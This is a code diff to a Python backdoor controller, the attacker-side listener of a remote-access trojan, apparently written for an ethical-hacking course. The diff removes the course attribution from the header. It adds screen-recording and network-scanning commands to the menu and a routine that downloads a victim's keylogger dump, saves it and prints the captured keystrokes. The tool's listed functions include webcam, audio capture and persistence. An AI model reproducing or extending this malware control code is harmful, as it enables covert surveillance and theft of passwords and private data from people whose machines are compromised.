@@ -1,7 +1,5 @@
 ################################################
-# Enhanced Backdoor Controller (Attacker Side) #
-# Author: Enhanced for DES484 Assignment       #
-# Class: SIIT Ethical Hacking                  #
+# Backdoor Controller (Attacker Side)          #
 # WARNING: For Educational Purposes Only!      #
 #                                              #
 # USAGE: Run this on the ATTACKER machine      #
@@ -13,11 +11,12 @@ import json
 import os
 import sys
 import time
+from datetime import datetime
 
 
 class BackdoorController:
-    """Enhanced backdoor controller for the attacker machine"""
-    
+    """Backdoor controller for the attacker machine"""
+
     def __init__(self, host='0.0.0.0', port=5555):
         self.host = host
         self.port = port
@@ -151,9 +150,10 @@ class BackdoorController:
         KEYLOGGER:          keylog_start, keylog_stop, keylog_dump
         PRIVILEGES:         priv_check, priv_enum, priv_services
         SCREEN:             screenshot, screenshot_multi 5 2, screenshot_list
+        RECORDING:          record_screen 10 15, record_start, record_stop, record_list
         AUDIO:              audio_record 10, audio_list
         WEBCAM:             webcam_snap
-        NETWORK:            net_info, net_scan, net_connections
+        NETWORK:            net_info, net_scan, net_connections, net_portscan, net_public_ip, net_check_internet
         PERSISTENCE:        persist_install, persist_check, persist_remove
 
         Type 'help_advanced' for detailed descriptions.
@@ -193,6 +193,49 @@ class BackdoorController:
                     # Receive the file
                     file_name = command[9:]
                     self.download_file(file_name)
+                    continue
+                
+                elif command == 'keylog_dump':
+                    # Special handling for keylog_dump - sends file automatically
+                    self.reliable_send(command)
+                    # First receive the status message
+                    result = self.reliable_recv()
+                    print("\n" + str(result))
+                    
+                    # If file exists, receive it
+                    if result and "Keylog file ready" in result:
+                        # Extract filename from message or use default
+                        import re
+                        match = re.search(r'Keylog file ready: (.+)', result)
+                        if match:
+                            remote_file = match.group(1)
+                            # Create local filename with timestamp
+                            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                            local_file = f'keylog_dump_{timestamp}.txt'
+                            
+                            print(f"[*] Downloading keylog file...")
+                            try:
+                                with open(local_file, 'wb') as f:
+                                    self.target_socket.settimeout(3)
+                                    chunk = self.target_socket.recv(1024)
+                                    while chunk:
+                                        f.write(chunk)
+                                        try:
+                                            chunk = self.target_socket.recv(1024)
+                                        except socket.timeout:
+                                            break
+                                    self.target_socket.settimeout(None)
+                                print(f"[+] Keylog file downloaded: {local_file}")
+                                
+                                # Also display the content
+                                with open(local_file, 'r', encoding='utf-8') as f:
+                                    content = f.read()
+                                    if content:
+                                        print("\n=== Keylog Content ===")
+                                        print(content)
+                                        print("=== End of Keylog ===\n")
+                            except Exception as e:
+                                print(f"[!] Error downloading keylog file: {e}")
                     continue
                 
                 elif command[:6] == 'upload':
